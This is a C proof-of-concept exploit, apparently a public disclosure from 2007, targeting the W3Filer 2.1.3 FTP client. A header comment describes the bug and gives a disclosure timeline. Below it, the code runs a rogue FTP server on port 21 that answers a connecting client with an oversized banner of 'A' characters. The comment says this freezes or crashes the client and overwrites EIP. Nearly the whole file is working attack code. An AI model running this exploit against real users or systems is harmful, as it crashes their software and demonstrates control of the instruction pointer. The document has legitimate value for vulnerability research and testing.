/*
	W3Filer Buffer Overflow Vulnerability
                      DoS POC

            r0ut3r (writ3r [at] gmail.com)

Version: 2.1.3

Description: If the client recieves a large banner when 
attempting to send a file the application will freeze, 
resulting in the user having to kill the application. 
Alternatively the application will immediately crash with
an exception report. Either one of the above happens. The
EIP is overwritten with A's. Version 3.1.3 is not vulnerable. 

Timeline: 
06/27/2007 - Vulnerability discovered
06/28/2007 - Contacted vendor
06/29/2007 - Public release
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 21

int s, c;
struct sockaddr_in sock_addr;

int main()
{
	char evilbuf[1500];

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sock_addr.sin_family = PF_INET;
	sock_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	sock_addr.sin_port = htons(PORT);

	bind(s, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
	printf("[+] Listening...\n");

	listen(s, 5);
	printf("[*] Waiting for client\n");

	c = accept(s, NULL, NULL);
	printf("[!] Client connected\n");

	memset(evilbuf,'A',1500);
        memcpy(evilbuf,"220 ",4);
	memcpy(evilbuf+1497,"\r\n\0",3);
	printf("[+] Attempting buffer overflow\n");

	if (send(c, evilbuf, strlen(evilbuf), 0) == -1)
	{
		printf("[-] Error sending..\n");
		return 1;
	}

	printf("[+] Sent! did it crash?\n");
	return 0;
}
